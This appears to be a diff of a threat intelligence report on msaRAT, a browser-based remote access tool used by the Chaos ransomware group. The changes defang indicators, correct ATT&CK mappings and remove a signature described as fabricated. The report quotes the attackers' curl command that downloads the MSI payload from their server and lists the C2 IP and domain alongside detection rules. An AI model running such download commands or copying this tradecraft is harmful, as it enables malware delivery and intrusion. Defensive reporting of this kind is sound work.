@@ -3,7 +3,8 @@
 Prepared by: Actioner
 Classification: TLP:WHITE
 Date: 2026-07-23
-Version: DRAFT
+Version: FINAL
+<!-- revision: critic NEEDS-REVISION applied 2026-07-23. Defanged prose IOCs (lines 28/182/190/desc fields). T1055→T1129. T1059→T1059.007. Removed fabricated ClamAV sig. Headless-browser rule labeled TTP-layer supplement. YARA sample tag removed (constructed input, not real sample). -->
 
 ## Executive Summary
 
@@ -25,7 +26,7 @@ msaRAT represents a significant evolution in C2 tradecraft by "living off the br
 The Chaos group uses email spam and voice phishing (vishing) as initial access vectors. Victims are socially engineered into executing a curl command that downloads the msaRAT MSI installer from attacker-controlled infrastructure. The exact command observed:
 
 ```
-curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi
+curl.exe hxxp://172.86.126[.]18:443/update_ms[.]msi -o C:\programdata\update_ms.msi
 ```
 
 Notably, the download uses plain HTTP over port 443 -- a deliberate choice to bypass port-based firewall rules that might block non-standard HTTP ports while avoiding TLS certificate inspection on what is typically the HTTPS port.
@@ -140,14 +141,14 @@ msaRAT is a Windows-targeting Rust binary compiled with the Tokio asynchronous r
 | T1204.002 | User Execution: Malicious File | Victim executes curl command to download and run MSI |
 | T1105 | Ingress Tool Transfer | curl.exe downloads MSI from attacker server |
 | T1218.007 | System Binary Proxy Execution: Msiexec | MSI custom action executes msaRAT DLL |
-| T1059 | Command and Scripting Interpreter | JavaScript injection into browser via CDP for WebRTC setup |
+| T1059.007 | Command and Scripting Interpreter: JavaScript | JavaScript injection into browser via CDP for WebRTC setup |
 | T1071.001 | Application Layer Protocol: Web Protocols | C2 signaling over HTTPS to Cloudflare Workers |
 | T1102.002 | Web Service: Bidirectional Communication | Cloudflare Workers used as signaling relay |
 | T1219 | Remote Access Software | Browser controlled via Chrome DevTools Protocol |
 | T1573.001 | Encrypted Channel: Symmetric Cryptography | ChaCha20-Poly1305 encryption on C2 channel |
 | T1090.002 | Proxy: External Proxy | Twilio TURN servers relay all C2 traffic |
 | T1036.005 | Masquerading: Match Legitimate Name or Location | MSI masquerades as Windows update |
-| T1055 | Process Injection | DLL loaded into memory from MSI Binary table |
+| T1129 | Shared Modules | DLL loaded into memory from MSI Binary table via custom action |
 
 ## Impact Assessment
 
@@ -179,7 +180,7 @@ Get-ChildItem -Path 'C:\ProgramData\' -Filter '*.msi' -Recurse | Select-Object F
 Check for network connections to the known C2 IP:
 
 ```powershell
-Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq '172.86.126.18' }
+Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq '172.86.126[.]18' }
 ```
 
 ### Remediation
@@ -187,10 +188,10 @@ Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq '172.86.126.18' }
 1. **Isolate** affected systems immediately
 2. **Kill** headless browser processes launched with remote debugging flags
 3. **Remove** any MSI files in `C:\ProgramData\` matching `update_ms.msi`
-4. **Block** the IP `172.86.126.18` and domain `is-01-ast.ols-img-12.workers.dev` at the network perimeter
+4. **Block** the IP `172.86.126[.]18` and domain `is-01-ast[.]ols-img-12[.]workers[.]dev` at the network perimeter
 5. **Hunt** for curl.exe download activity to `C:\ProgramData\` in recent logs
 6. **Rotate** credentials on affected systems
-7. **Scan** with updated signatures (ClamAV: `Win.Downloader.ChaosRaas-10060321-0`)
+7. **Scan** with updated AV/EDR signatures
 
 ### Long-Term Hardening
 
@@ -292,7 +293,7 @@ id: 9c5a3b14-6d0e-4f7a-c8b3-4e1f2a0d9c6b
 status: experimental
 description: >
     Detects DNS queries to the Cloudflare Workers domain used by msaRAT for
-    WebRTC SDP signaling relay. The domain is-01-ast.ols-img-12.workers.dev
+    WebRTC SDP signaling relay. The domain is-01-ast[.]ols-img-12[.]workers[.]dev
     serves as the rendezvous point for SDP Offer/Answer exchange.
 references:
     - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
@@ -322,7 +323,7 @@ title: msaRAT MSI Delivery Server Network Connection
 id: ad6b4c25-7e1f-4a8b-d9c4-5f2a3b1e0d7c
 status: experimental
 description: >
-    Detects outbound network connections to IP 172.86.126.18, the attacker-controlled
+    Detects outbound network connections to IP 172.86.126[.]18, the attacker-controlled
     server used by the Chaos ransomware group to deliver the msaRAT MSI installer
     (update_ms.msi) over plain HTTP on port 443.
 references:
